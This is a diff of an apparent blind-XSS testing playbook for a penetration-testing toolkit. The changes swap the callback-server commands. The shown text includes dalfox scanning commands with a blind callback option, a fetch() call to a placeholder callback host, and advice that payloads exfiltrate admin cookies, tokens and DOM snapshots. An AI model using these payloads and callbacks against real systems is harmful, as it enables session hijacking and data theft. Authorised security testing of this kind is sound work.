@@ -21,7 +21,7 @@ Most XSS findings in 2025 are in client-side rendering contexts (React `dangerou
 - `dalfox` — automated reflected XSS scanner: parameter analysis, context detection, WAF fingerprinting, blind XSS via callback
 - `curl` / Burp Suite Repeater — manual request crafting and response analysis
 - Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration
-- OOB callback server — blind XSS verification (operator-provisioned, see operator-core Listener & Callback Management)
+- OOB callback client — blind XSS verification through `aith oob status --json` and `aith oob client logs <name>`
 
 ---
 
@@ -54,7 +54,7 @@ dalfox url "https://TARGET/search?q=test" --silence
 # Pipe discovered URLs (from gau, katana, or param-fuzzing output)
 cat urls_with_params.txt | dalfox pipe --silence
 
-# With blind XSS callback (use OOB_CALLBACK_URL from operator dispatch context)
+# With blind XSS callback (use the unique URL from `aith oob client logs <name>`)
 dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
 
 # JSON output for triage
@@ -267,7 +267,7 @@ fetch('https://YOUR_OOB_CALLBACK/hit', {
 ### Operational Notes
 
 - **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Set callbacks and be patient.
-- **Callback verification**: After injecting, check the named OOB client log periodically (`aith assess kali exec -- tail -50 /data/oob/clients/<name>.log --technique RECON --intent "tail OOB client log for blind XSS hits" --probe-kind fingerprint --phase consume-test --timeout 30`), or ask the operator for `aith oob client logs <name>`. A hit proves the payload rendered in an internal context.
+- **Callback verification**: After injecting, check shared readiness with `aith oob status --json`, then check the named client periodically with `aith oob client logs <name> --lines 80`. Use `aith logs oob --lines 80` only when debugging raw server/FRP health. A correlated client hit proves the payload rendered in an internal context.
 - **Impact escalation**: A blind XSS in an admin panel is not just "XSS." If the admin panel has: user management (account takeover), payment processing (financial impact), server configuration (RCE chain), or API key management (full compromise) — the XSS inherits that blast radius.
 - **Evidence capture**: The callback payload should exfil enough context to prove impact: the URL where it fired (shows it was admin panel), cookies/tokens (shows session hijack is possible), and a DOM snapshot (shows what the admin sees).
 
